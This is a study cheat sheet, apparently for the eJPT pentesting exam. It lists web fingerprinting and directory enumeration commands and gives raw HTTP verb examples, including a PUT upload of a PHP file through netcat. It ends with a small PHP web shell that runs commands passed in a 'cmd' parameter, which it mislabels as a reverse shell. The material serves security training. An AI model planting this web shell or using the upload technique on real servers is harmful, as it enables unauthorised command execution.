# Web Application Tools
 My list of Web Application tools for the eJPT exam.

-------------------------------------

## *HTTP Protocol and Fingerprinting*

1. Netcat
    * nc [targetAddress] 80

2. OpenSSL s_client -connect [targetAddress:443]

3. httprint -P0 -h [targetAddress] -s /usr/share/httprint/signatures.txt

-------------------------------------

## *HTTP Verbs - Use in Burpsuite*

### (Can be used on misconfigured web servers)

- GET - Request a webpage
- HEAD - Request Header information
- POST - Post form data (eg, username, password)
- PUT - Create an arbitrary file on the server
- DELETE - Delete/remove file from the server
- OPTIONS - Check communications option

"GET" Example:

    GET /page.php?comman=pwd HTTP/1.1
    Host: www.host.com


"POST" Example:

    POST /login.php? HTTP/1.1
    Host: www.host.com


    username=admin&password=1234


"DELETE" Example:

    DELETE /wp-content/imp.file HTTP/1.1
    Host: www.host.com

"PUT" Example: 
    
    $wc -m payload.php
    20 payload.php

    $nc [targetAddress] 80
    PUT /payload.php HTTP/1.0
    Content-type: text/html
    Content-length: 20


    <?php phpinfo(); ?>

-------------------------------------

## *Dirbuster(GUI)/Gobuster/Dirb*

* Search for interesting file types
    * php
    * txt
    * bak
    * old

    $gobuster dir --url http://host.com/ -w /path/to/word.list -x php,txt,old,bak -o output.txt

    $dirb http://host.com/ /path/to/word.list -X php,txt,bak,old -o output.txt

    $dirb https://host.com/ (Simple SSL test)

*Tips: Searh for **Signup pages** and **old configuration files.***






-------------------------------------

## *Reverse Shell Links*

[Pentest Monkey Website] (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[GTFOBins Website] (https://gtfobins.github.io/)


Example PHP Reverse Shell:

    <?php 
    if (isset($_GET['cmd']))
    {
        $cmd = $_GET['cmd'];
        echo '<pre>';
        $result = shell_exec($cmd);
        echo $result;
        echo '</pre>';
    }
    >

